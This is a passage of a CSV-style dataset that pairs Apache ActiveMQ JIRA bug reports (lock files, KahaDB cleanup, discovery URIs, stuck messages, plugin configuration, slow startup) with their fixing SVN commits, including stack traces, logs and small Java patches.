git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1032969 13f79535-47bb-0310-9956-ffa450edef68"
12483828,AMQ-3007,"The slave will output these messages:

INFO | Database /mnt/activemqdata/lock is locked... waiting 10 seconds for the database to be unlocked ......

After awhile, the messages change to:

INFO | Database /mnt/activemqdata/lock is locked... waiting 10 seconds for the database to be unlocked. Reason: java.io.FileNotFoundException: /mnt/activemq/lock (Too many open files) ....

Upon inspection of LockFile.lock(), OverlappingFileLockException is the only exception caught.  In the event tryLock() throws IOException, as it does in
my case, the readFile isn't cleaned up and the caller (which catches IOExceptions), just iterates again.

Since javadoc says FileChannel.tryLock() throws an IOException, and the caller in this case, and MessageDatabase expects to catch IOExceptions, it
would seem like adding this to the code in LockFile.lock() should fix this issue.

catch (IOException e)
{
    reason = e;
}


",d650d0c7e1e700316a34baee889fbd948c30da72,"apply fix from https://issues.apache.org/activemq/browse/AMQ-3007 - with thanks

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1028637 13f79535-47bb-0310-9956-ffa450edef68"
12483506,AMQ-2986,"Even if the usage is calculated appropriately, the value displayed in JConsole is cached and not calculated on every call, so you can get impression that it's not updated.",51ef021073752f2cf8907fa0efdf8c93015dd77b,"https://issues.apache.org/activemq/browse/AMQ-2986 - JMX and store percent usage

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1023795 13f79535-47bb-0310-9956-ffa450edef68"
12483803,AMQ-2982,On a rollback of a local transaction the transaction won't be removed from the inflight transaction list of the KahaDB MessageDatabase. This leads to KahaDB log files which won't be deleted even if there are no messages which are referred by the log file.,6ebc82c5c47e46479289b756514e0af44ff385b7,"https://issues.apache.org/activemq/browse/AMQ-2982 - sticky kahadb log files on rollback

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1027451 13f79535-47bb-0310-9956-ffa450edef68"
12483499,AMQ-2981,"steps to reproduce

1. have a broker running on a port say '12345' and group say 'test' using activemq-core version 5.4.0 or 5.4.1
2.  use url 
discovery:(multicast://default?group=test)?reconnectDelay=1000&maxReconnectAttempts=30&useExponentialBackOff=false 
to connect to the broker
3. the following exception occurs



Caused by: javax.jms.JMSException: Invalid connect parameters: {reconnectDelay=1000, maxReconnectAttempts=30, useExponentialBackOff=false}
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:62)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1298)
	at org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1382)
	at org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:309)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at org.springframework.jms.connection.SingleConnectionFactory$SharedConnectionInvocationHandler.invoke(SingleConnectionFactory.java:550)
	at $Proxy34.createSession(Unknown Source)
	at org.springframework.jms.support.JmsAccessor.createSession(JmsAccessor.java:196)
	at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:457)
	... 38 more
Caused by: java.io.IOException: Invalid connect parameters: {reconnectDelay=1000, maxReconnectAttempts=30, useExponentialBackOff=false}
	at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:45)
	at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:594)
	at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)
	at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
	at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:81)
	at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:86)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1276)
	... 48 more
Caused by: java.lang.IllegalArgumentException: Invalid connect parameters: {reconnectDelay=1000, maxReconnectAttempts=30, useExponentialBackOff=false}
	at org.apache.activemq.transport.TransportFactory.doCompositeConnect(TransportFactory.java:159)
	at org.apache.activemq.transport.TransportFactory.compositeConnect(TransportFactory.java:93)
	at org.apache.activemq.transport.failover.FailoverTransport.doReconnect(FailoverTransport.java:844)
	at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:135)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)


4. downgrading to amq 5.3.2 solves the problem

NOTE: a new functionality has been added to 5.4.0 

ref : http://activemq.apache.org/discovery-transport-reference.html

Applying parameters to discovered transports
From 5.4, transport parameters in the URI will also be applied to discovered transports. Therefore, transport parameters may also include parameters for the discovered transport. For example, adding the connectionTimeout parameter to the URI will apply the parameter to every discovered TCP transport, even though this parameter is not a Discovery transport option.


I think the above change has caused the problem






",5ad72d650cce2d09881f4b7f0cf1eebdb79c4a7a,"https://issues.apache.org/jira/browse/AMQ-2981 - test case for discory uri with params

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1075407 13f79535-47bb-0310-9956-ffa450edef68"
12483539,AMQ-2970,Currently these operations don't trigger advisory events.,9e885efca2b4767528ce88e95bc2cc7b1dcd7ddf,"seems to be regression from: https://issues.apache.org/activemq/browse/AMQ-2970 - but there is some mix up with the creation of an admin connection context. having the BrokerView do the right thing works for the moment... but this needs some more eyes, test shows the issue when context is missing

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1026092 13f79535-47bb-0310-9956-ffa450edef68"
12483849,AMQ-2955,"Using the following test client, we see a single message getting stuck on the queue. This then prevents the KahaDB files from being cleaned up. Once this message gets stuck, we need to restart the broker before it can be consumed. This is a total show stopper for us, as when this occurs in our system the large number of messages that we produce and consume each second causes the disk to run out of space within the space of an hour. We also see the same behaviour using synchronous sending and without failover.

This doesn't happen every time with the test client - the most reliable way I have found to reproduce it is to start the broker and wait for the first MessageDatabase checkpoint to finish before starting the test client. 

{code:title=Test Client}
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.util.Random;

import javax.jms.Connection;
import javax.jms.Message;
import javax.jms.MessageConsumer;
import javax.jms.MessageListener;
import javax.jms.MessageProducer;
import javax.jms.Queue;
import javax.jms.Session;
import javax.jms.ConnectionFactory;

import org.apache.activemq.ActiveMQConnectionFactory;

public class Test {
        public static final void main(String[] args) throws Exception {
                ConnectionFactory cf = new ActiveMQConnectionFactory(""failover:(tcp://localhost:61616)?jms.useAsyncSend=true&trackMessages=true"");
                final Connection producerConn = cf.createConnection();
                final Connection consumerConn = cf.createConnection();

                final BufferedWriter producerLog = new BufferedWriter(new FileWriter(""produced.log""));
                final BufferedWriter consumerLog = new BufferedWriter(new FileWriter(""consumed.log""));

                new Thread(new Runnable() {
                        public void run() {
                                try {
                                        producerConn.start();
                                        Session session = producerConn.createSession(false, Session.CLIENT_ACKNOWLEDGE);
                                        Queue queue = session.createQueue(""TEST_QUEUE"");
                                        MessageProducer producer = session.createProducer(queue);
                                        Random random = new Random();
                                        byte[] messageBytes = new byte[1024];

                                        for (int i = 0; i < 100000; i++) {
                                        //while (true) {
                                                random.nextBytes(messageBytes);
                                                Message message = session.createObjectMessage(messageBytes);
                                                producer.send(message);
                                                producerLog.write(message.getJMSMessageID());
                                                producerLog.newLine();
                                                producerLog.flush();
                                        }
                                        System.out.println(""Produced 100000 messages..."");
                                        producerLog.close();
                                }
                                catch (Exception e) {
                                        e.printStackTrace();
                                }
                        }
                }).start();

                System.out.println(""Started producer..."");

                new Thread(new Runnable() {
                        public void run() {
                                try {
                                        consumerConn.start();
                                        Session session = consumerConn.createSession(false, Session.CLIENT_ACKNOWLEDGE);
                                        Queue queue = session.createQueue(""TEST_QUEUE"");
                                        MessageConsumer consumer = session.createConsumer(queue);
                                        consumer.setMessageListener(new MessageListener() {
                                                public void onMessage(Message message) {
                                                        try {
                                                                message.acknowledge();
                                                                consumerLog.write(message.getJMSMessageID());
                                                                consumerLog.newLine();
                                                                consumerLog.flush();
                                                        }
                                                        catch (Exception e) {
                                                                e.printStackTrace();
                                                        }
                                                }
                                        });
                                }
                                catch (Exception e) {
                                        e.printStackTrace();
                                }
                        }
                }).start();

                System.out.println(""Started consumer..."");
        }
}
{code}

After the 100,000 messages have been produced, we can see the following difference in the log files:

{noformat}
[pblackburn@xxxx test]$ diff produced.log consumed.log
10394d10393
< ID:xxxx-35451-1285948546531-0:0:1:1:10394
[pblackburn@xxxx test]$
{noformat}

Looking in the activemq log file, at around this point we see:

{noformat}
2010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 205, pagedInMessages.size 349, enqueueSize: 10390
2010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 205, pagedInMessages.size 350, enqueueSize: 10391
2010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 205, pagedInMessages.size 351, enqueueSize: 10392
2010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 205, pagedInMessages.size 352, enqueueSize: 10393
2010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 69% of available memory, to: 70% of available memory
2010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 70% of available memory, to: 69% of available memory
2010-10-01 15:55:51 AbstractStoreCursor [DEBUG] TEST_QUEUE disabling cache on size:0, lastCachedIdSeq: 10398 current node seqId: 10399
2010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 69% of available memory, to: 70% of available memory
2010-10-01 15:55:51 Queue [DEBUG] TEST_QUEUE toPageIn: 2, Inflight: 353, pagedInMessages.size 353, enqueueSize: 10395
2010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 70% of available memory, to: 69% of available memory
2010-10-01 15:55:51 Usage [DEBUG] Main:memory:queue://TEST_QUEUE:memory: usage change from: 69% of available memory, to: 70% of available memory
{noformat}

At the end of the log file, where we have a single message stuck on the queue, we see:

{noformat}
2010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 100000
2010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 100000
2010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 100000
2010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 100000
2010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 100000
2010-10-01 15:56:10 Queue [DEBUG] TEST_QUEUE toPageIn: 1, Inflight: 0, pagedInMessages.size 0, enqueueSize: 100000
{noformat}

We can see the checkpoint failing to clean up the log files:

{noformat}
2010-10-01 15:56:36 MessageDatabase [DEBUG] Checkpoint started.
2010-10-01 15:56:36 MessageDatabase [DEBUG] not removing data file: 2 as contained ack(s) refer to referenced file: [1, 2]
2010-10-01 15:56:36 MessageDatabase [DEBUG] not removing data file: 3 as contained ack(s) refer to referenced file: [2, 3]
2010-10-01 15:56:36 MessageDatabase [DEBUG] not removing data file: 4 as contained ack(s) refer to referenced file: [3, 4]
2010-10-01 15:56:36 MessageDatabase [DEBUG] not removing data file: 5 as contained ack(s) refer to referenced file: [4, 5]
2010-10-01 15:56:36 MessageDatabase [DEBUG] Checkpoint done.
{noformat}

At this point our consumer had consumed all of the messages except the single stuck message.

We are using a clean out of the box set up - we have made no changes to the default activemq.xml file,

",1e900b300a62d2cfbdebfce4ef8235fb31576622,"a little more debug info on file gc, https://issues.apache.org/activemq/browse/AMQ-2955

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1021747 13f79535-47bb-0310-9956-ffa450edef68"
12483865,AMQ-2939,"With Activemq 5.3.2, I had this in my activemq.xml:
 
<beans xmlns=""http://www.springframework.org/schema/beans""
	xmlns:amq=""http://activemq.apache.org/schema/core"" 
	xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
	xsi:schemaLocation=""
    http://activemq.apache.org/schema/core
        http://activemq.apache.org/schema/core/activemq-core-5.4.1.xsd
    http://camel.apache.org/schema/spring
    http://camel.apache.org/schema/spring/camel-spring.xsd
    http://www.springframework.org/schema/beans
	http://www.springframework.org/schema/beans/spring-beans-2.0.xsd
	"">

<bean id=""myPlugin"" class=""com.yahoo.MyPlugin"">
	<property name=""disabled"">
		<value>false</value>
	</property>
</bean>

<broker xmlns=""http://activemq.apache.org/schema/core""
	brokerName=""broker1"" dataDirectory=""${activemq.base}/data"" plugins=""#myPlugin"">
	<transportConnectors>
		<transportConnector name=""openwire"" uri=""tcp://0.0.0.0:61616"" />
	</transportConnectors>
</broker>
</beans>

Relevant email thread.

-----Original Message-----
From: chubrilo@gmail.com [mailto:chubrilo@gmail.com] On Behalf Of Dejan Bosanac
Sent: Thursday, September 23, 2010 4:19 AM
To: users@activemq.apache.org
Subject: Re: configuring plugins with activemq 5.4.1

Hi Allen,

can you raise an issue for this, as it is an obvious regression? It's probably due the fact that in 5.4 we're back to autogenerating schema.

Cheers
--
Dejan Bosanac - http://twitter.com/dejanb

Open Source Integration - http://fusesource.com/ ActiveMQ in Action - http://www.manning.com/snyder/ Blog - http://www.nighttale.net



On Wed, Sep 22, 2010 at 10:58 PM, Allen Reese <areese@yahoo-inc.com> wrote:
> The problem is plugins as an attribute of broker seems to be removed in the 5.4.1 xsd.
>
> I want to configure the plugin once outside of the brokers, the reason is, I use an <import resource=""brokers.xml"">, and want to allow other people to reuse the plugin configuration without having to have it as part of their broker definition.
>
> I guess I'll keep playing around as I have some other ideas of how to do this, but I'm still confused if I setup my own xsd with an element for the plugin, how do I tie that to the plugin bean?
>
> --Allen
>
>
> -----Original Message-----
> From: Stan Lewis [mailto:slewis@fusesource.com]
> Sent: Wednesday, September 22, 2010 3:10 PM
> To: users@activemq.apache.org
> Subject: Re: configuring plugins with activemq 5.4.1
>
> Should be able to do something like:
>
> <plugins>
>   <bean xmlns=""http://www.springframework.org/schema/beans""
> id=""myPlugin"" class=""com.yahoo.MyPlugin"">
>        <property name=""disabled"">
>                <value>false</value>
>        </property>
>   </bean>
> </plugins>
>
> for this, there's some other examples here:
>
> http://activemq.apache.org/developing-plugins.html#DevelopingPlugins-C
> onfiguringpluginswithoutcustomXML
>
> On Wed, Sep 22, 2010 at 3:48 PM, Allen Reese <areese@yahoo-inc.com> wrote:
>> With Activemq 5.3.2, I had this in my activemq.xml:
>>
>> <beans xmlns=""http://www.springframework.org/schema/beans""
>>        xmlns:amq=""http://activemq.apache.org/schema/core""
>>        xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
>>        xsi:schemaLocation=""
>>    http://activemq.apache.org/schema/core
>>        http://activemq.apache.org/schema/core/activemq-core-5.4.1.xsd
>>    http://camel.apache.org/schema/spring
>>    http://camel.apache.org/schema/spring/camel-spring.xsd
>>    http://www.springframework.org/schema/beans
>>
>> http://www.springframework.org/schema/beans/spring-beans-2.0.xsd
>>        "">
>>
>> <bean id=""myPlugin"" class=""com.yahoo.MyPlugin"">
>>        <property name=""disabled"">
>>                <value>false</value>
>>        </property>
>> </bean>
>>
>> <broker xmlns=""http://activemq.apache.org/schema/core""
>>        brokerName=""broker1"" dataDirectory=""${activemq.base}/data""
>> plugins=""#myPlugin"">
>>        <transportConnectors>
>>                <transportConnector name=""openwire""
>> uri=""tcp://0.0.0.0:61616"" />
>>        </transportConnectors>
>> </broker>
>> </beans>
>>
>> However, when I upgrade to 5.4.1, this no longer works as plugins is no longer supported as an attribute of the broker element.
>>
>> I'm not really certain how to wire in a custom plugin any more, can anyone provide some information on how to do this with the 5.4.1 schema?
>>
>> Here was my first shot at it, but I know I'm missing how to tie the bean to the namespace.
>>
>> <beans xmlns=""http://www.springframework.org/schema/beans""
>>        xmlns:amq=""http://activemq.apache.org/schema/core""
>>        xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
>>        xsi:schemaLocation=""
>>    http://activemq.apache.org/schema/core
>>        http://activemq.apache.org/schema/core/activemq-core-5.4.1.xsd
>>    http://camel.apache.org/schema/spring
>>    http://camel.apache.org/schema/spring/camel-spring.xsd
>>    http://www.springframework.org/schema/beans
>>        http://www.springframework.org/schema/beans/spring-beans-2.0.xsd""
>>      >
>>
>> <bean id=""myPlugin"" class=""com.yahoo.MyPlugin"">
>>        <property name=""disabled"">
>>                <value>false</value>
>>        </property>
>> </bean>
>>
>>        <broker xmlns=""http://activemq.apache.org/schema/core""
>>                brokerName=""broker1""
>> dataDirectory=""${activemq.base}/data"">
>>        <plugins><myPlugin
>> xmlns=""http://yahoo.com/schema/java""/></plugins>
>>                <transportConnectors>
>>                        <transportConnector name=""stomp""
>> uri=""tcp://0.0.0.0:61616"" />
>>                </transportConnectors>
>>        </broker>
>> </beans>
>>
>> Thanks.
>>
>> --Allen Reese
>
",5edede1d0bae76510e42a16f8381570ad26fbfda,"partial fix for https://issues.apache.org/activemq/browse/AMQ-2939 - allow the management context port values to be properties by ensuring that their schema is of type string rather than integer

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1028278 13f79535-47bb-0310-9956-ffa450edef68"
12483530,AMQ-2915,Basically when you create a queue/topic and connect either a producer or consumer to that queue/topic advisory topics are created; if you later delete the queue/topic the advisory topics aren't cleaned up.  This could become a problem for folks that tend to create and destroy queues/topics often for whatever reason.  Patch fixes this and adds a test for topics and queues.,6672740da0a4c9c5d6b084614f390e5d0539ada4,"fix for: https://issues.apache.org/activemq/browse/AMQ-2915

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@996646 13f79535-47bb-0310-9956-ffa450edef68"
12483856,AMQ-2908,"Slow consumer gets stuck when consuming from queue that has expiring messages in it. 

Looked into broker while it got stuck and saw that PrefetchSubscription.dispatched is full of expired messages.

WORKAROUND
Into doActualDispatch added check that if subscription is full, it will remove all expired message from dispatch.

{code}
Index: trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/PrefetchSubscription.java
===================================================================
--- trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/PrefetchSubscription.java               (revision 42304)
+++ trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/PrefetchSubscription.java            (working copy)
@@ -400,6 +400,21 @@
         }
     }
 
+   public void removeExpiredMessagesFromDispatch() {
+     synchronized(dispatchLock) {
+                  for (Iterator<MessageReference> iter = dispatched.iterator(); iter.hasNext(); ) {
+                    final MessageReference node = iter.next();
+                    if (node.isExpired()) {
+                        if (broker.isExpired(node)) {
+                            node.getRegionDestination().messageExpired(context, this, node);
+                        }
+                        dispatched.remove(node);
+                        node.getRegionDestination().getDestinationStatistics().getInflight().decrement();
+                    }
+                  }
+     }
+   }
+    
     /**
      * Checks an ack versus the contents of the dispatched list.
      * 
{code}

{code}
Index: trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/Queue.java
===================================================================
--- trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/Queue.java           (revision 42304)
+++ trunk/activemq-core/src/main/java/org/apache/activemq/broker/region/Queue.java        (working copy)
@@ -1543,6 +1543,9 @@
                 }
                 if (dispatchSelector.canSelect(s, node)) {
                     if (!fullConsumers.contains(s)) {
+                               if (s.isFull() && s instanceof PrefetchSubscription) {
+                                             ((PrefetchSubscription)s).removeExpiredMessagesFromDispatch();
+                               }
                         if (!s.isFull()) {
                             // Dispatch it.
                             s.add(node);

{code}",ca668019a07ce817de0e6a9a882af9f1d06b3da3,"starter test case for https://issues.apache.org/activemq/browse/AMQ-2908 - it works though

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1031136 13f79535-47bb-0310-9956-ffa450edef68"
12483509,AMQ-2897,"Problem: Job scheduler does not get started after broker restart.

1) Fire up the broker (using default config (bin/activemq console)
2) Start the client app (I'm using Mule)
3) Post a message to the queue with AMQ_SCHEDULED_DELAY set to some value (10000ms)
4) Shut down the broker
5) Fire up the broker again

Expected behavior: The broker would start the job scheduler and fire off the job waiting
Actual behavior: The job scheduler starts when 

1) a new message is posted to the queue with the AMQ_SCHEDULED_DELAY set
2) I click on the ""Scheduled"" link in the admin ui

",f2816deb1c90ac45df4fa66ae4c7d6ef44ed4d6a,"fix hanging test that did not stop broker in shutdown, schedualler on startup shows it up: https://issues.apache.org/activemq/browse/AMQ-2897

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@996962 13f79535-47bb-0310-9956-ffa450edef68"
12483509,AMQ-2897,"Problem: Job scheduler does not get started after broker restart.

1) Fire up the broker (using default config (bin/activemq console)
2) Start the client app (I'm using Mule)
3) Post a message to the queue with AMQ_SCHEDULED_DELAY set to some value (10000ms)
4) Shut down the broker
5) Fire up the broker again

Expected behavior: The broker would start the job scheduler and fire off the job waiting
Actual behavior: The job scheduler starts when 

1) a new message is posted to the queue with the AMQ_SCHEDULED_DELAY set
2) I click on the ""Scheduled"" link in the admin ui

",487834164ce0452c8624b86571950f33531114d8,"resolve another hanging test, broker names need to be added to differenciat sehadualler stores: https://issues.apache.org/activemq/browse/AMQ-2897

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@997225 13f79535-47bb-0310-9956-ffa450edef68"
12483509,AMQ-2897,"Problem: Job scheduler does not get started after broker restart.

1) Fire up the broker (using default config (bin/activemq console)
2) Start the client app (I'm using Mule)
3) Post a message to the queue with AMQ_SCHEDULED_DELAY set to some value (10000ms)
4) Shut down the broker
5) Fire up the broker again

Expected behavior: The broker would start the job scheduler and fire off the job waiting
Actual behavior: The job scheduler starts when 

1) a new message is posted to the queue with the AMQ_SCHEDULED_DELAY set
2) I click on the ""Scheduled"" link in the admin ui

",5bf3696c81dd8f2f542cf3dd9ed588c24f095df4,"resolve another hanging test, broker not stopped on teardown: https://issues.apache.org/activemq/browse/AMQ-2897

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@997250 13f79535-47bb-0310-9956-ffa450edef68"
12483478,AMQ-2896,"When I run mvn eclipse:eclipse, I get the following error:

{code}
Caused by: org.apache.maven.artifact.resolver.ArtifactResolutionException: Failed to resolve artifact, possibly due to a repository list that is not appropriately equipped for this artifact's metadata.
  org.apache.maven.plugins:maven-eclipse-plugin:pom:2.8-SNAPSHOT

from the specified remote repositories:
  apache.snapshots (https://repository.apache.org/content/repositories/snapshots/),
  central (http://repo1.maven.org/maven2)


	at org.apache.maven.artifact.resolver.DefaultArtifactResolver.resolve(DefaultArtifactResolver.java:221)
	at org.apache.maven.artifact.resolver.DefaultArtifactResolver.resolve(DefaultArtifactResolver.java:90)
	at org.apache.maven.project.DefaultMavenProjectBuilder.findModelFromRepository(DefaultMavenProjectBuilder.java:558)
	... 24 more

{code}

Fixing this shortly...",bea9f68d9a11483b6a280cbcf6026c1f7c050180,"AMQ-2896 - configure maven-eclipse-plugin so it doesn't try and get a 2.8-SNAPSHOT version that doesn't exist

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@991936 13f79535-47bb-0310-9956-ffa450edef68"
12482391,AMQ-2891,"ActiveMQ takes around five minutes to start with KahaDb with more than 10000 messages. All messages are persistent queue. 
With 500,000 persistent messsages, ittook around 20 minutes to start.

See the five minutes time difference between lines:

2010-08-31 12:55:19,286 | INFO | PListStore:C:\ActiveMQ\apache-activemq-5.4.0\bin\win32\..\..\data\localhost\tmp_storage initialized | org.apache.activemq.store.kahadb.plist.PListStore | WrapperSimpleAppMain
2010-08-31 13:03:56,983 | INFO | Listening for connections at: nio://S90356004630988:61616 | org.apache.activemq.transport.TransportServerThreadSupport | WrapperSimpleAppMain

From activemq.log with 100,000 messages

2010-08-31 12:55:10,436 | INFO | JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi | org.apache.activemq.broker.jmx.ManagementContext | JMX connector
2010-08-31 12:55:11,294 | INFO | KahaDB is version 2 | org.apache.activemq.store.kahadb.MessageDatabase | WrapperSimpleAppMain
2010-08-31 12:55:11,435 | INFO | Recovering from the journal ... | org.apache.activemq.store.kahadb.MessageDatabase | WrapperSimpleAppMain
2010-08-31 12:55:11,435 | INFO | Recovery replayed 1 operations from the journal in 0.063 seconds. | org.apache.activemq.store.kahadb.MessageDatabase | WrapperSimpleAppMain
2010-08-31 12:55:12,090 | INFO | ActiveMQ 5.4.0 JMS Message Broker (localhost) is starting | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain
2010-08-31 12:55:12,090 | INFO | For help or more information please see: http://activemq.apache.org/ | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain
2010-08-31 12:55:12,278 | INFO | Scheduler using directory: activemq-data\scheduler | org.apache.activemq.broker.scheduler.SchedulerBroker | WrapperSimpleAppMain
2010-08-31 12:55:19,286 | INFO | PListStore:C:\ActiveMQ\apache-activemq-5.4.0\bin\win32\..\..\data\localhost\tmp_storage initialized | org.apache.activemq.store.kahadb.plist.PListStore | WrapperSimpleAppMain
2010-08-31 13:03:56,983 | INFO | Listening for connections at: nio://S90356004630988:61616 | org.apache.activemq.transport.TransportServerThreadSupport | WrapperSimpleAppMain
2010-08-31 13:03:56,999 | INFO | Connector nio Started | org.apache.activemq.broker.TransportConnector | WrapperSimpleAppMain
2010-08-31 13:03:57,045 | INFO | ActiveMQ JMS Message Broker (localhost, ID:S90356004630988-3777-1283273712137-0:0) started | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain
2010-08-31 13:03:57,639 | INFO | Logging to org.slf4j.impl.JCLLoggerAdapter(org.eclipse.jetty.util.log) via org.eclipse.jetty.util.log.Slf4jLog | org.eclipse.jetty.util.log | WrapperSimpleAppMain
2010-08-31 13:03:57,639 | INFO | jetty-7.0.1.v20091125 | org.eclipse.jetty.util.log | WrapperSimpleAppMain
2010-08-31 13:03:58,451 | INFO | ActiveMQ WebConsole initialized. | org.apache.activemq.web.WebConsoleStarter | WrapperSimpleAppMain
2010-08-31 13:03:58,857 | INFO | Initializing Spring FrameworkServlet 'dispatcher' | /admin | WrapperSimpleAppMain
2010-08-31 13:03:59,341 | INFO | ActiveMQ Console at http://0.0.0.0:8161/admin | org.eclipse.jetty.util.log | WrapperSimpleAppMain
2010-08-31 13:04:00,091 | INFO | Initializing Spring root WebApplicationContext | /camel | WrapperSimpleAppMain
2010-08-31 13:04:02,668 | INFO | Connector vm://localhost Started | org.apache.activemq.broker.TransportConnector | WrapperSimpleAppMain
2010-08-31 13:04:04,526 | INFO | Camel Console at http://0.0.0.0:8161/camel | org.eclipse.jetty.util.log | WrapperSimpleAppMain
2010-08-31 13:04:04,589 | INFO | ActiveMQ Web Demos at http://0.0.0.0:8161/demo | org.eclipse.jetty.util.log | WrapperSimpleAppMain
2010-08-31 13:04:04,651 | INFO | RESTful file access application at http://0.0.0.0:8161/fileserver | org.eclipse.jetty.util.log | WrapperSimpleAppMain
2010-08-31 13:04:04,698 | INFO | Started SelectChannelConnector@0.0.0.0:8161 | org.eclipse.jetty.util.log | WrapperSimpleAppMain
2

With 500,000 messages, AMQ took 20 minutes to start.
2010-08-31 15:24:31,178 | INFO  | JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi | org.apache.activemq.broker.jmx.ManagementContext | JMX connector
2010-08-31 15:24:31,975 | INFO  | KahaDB is version 2 | org.apache.activemq.store.kahadb.MessageDatabase | WrapperSimpleAppMain
2010-08-31 15:24:32,194 | INFO  | Recovering from the journal ... | org.apache.activemq.store.kahadb.MessageDatabase | WrapperSimpleAppMain
2010-08-31 15:24:32,194 | INFO  | Recovery replayed 1 operations from the journal in 0.047 seconds. | org.apache.activemq.store.kahadb.MessageDatabase | WrapperSimpleAppMain
2010-08-31 15:24:35,365 | INFO  | ActiveMQ 5.4.0 JMS Message Broker (localhost) is starting | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain
2010-08-31 15:24:35,365 | INFO  | For help or more information please see: http://activemq.apache.org/ | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain
2010-08-31 15:24:35,552 | INFO  | Scheduler using directory: activemq-data\scheduler | org.apache.activemq.broker.scheduler.SchedulerBroker | WrapperSimpleAppMain
2010-08-31 15:24:48,034 | INFO  | PListStore:C:\ActiveMQ\apache-activemq-5.4.0\bin\win32\..\..\data\localhost\tmp_storage initialized | org.apache.activemq.store.kahadb.plist.PListStore | WrapperSimpleAppMain
2010-08-31 15:45:09,767 | INFO  | Listening for connections at: nio://S90356004630988:61616 | org.apache.activemq.transport.TransportServerThreadSupport | WrapperSimpleAppMain
2010-08-31 15:45:09,767 | INFO  | Connector nio Started | org.apache.activemq.broker.TransportConnector | WrapperSimpleAppMain
2010-08-31 15:45:09,876 | INFO  | ActiveMQ JMS Message Broker (localhost, ID:S90356004630988-3029-1283282675427-0:0) started | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain
2010-08-31 15:45:10,923 | INFO  | Logging to org.slf4j.impl.JCLLoggerAdapter(org.eclipse.jetty.util.log) via org.eclipse.jetty.util.log.Slf4jLog | org.eclipse.jetty.util.log | WrapperSimpleAppMain
2010-08-31 15:45:10,923 | INFO  | jetty-7.0.1.v20091125 | org.eclipse.jetty.util.log | WrapperSimpleAppMain
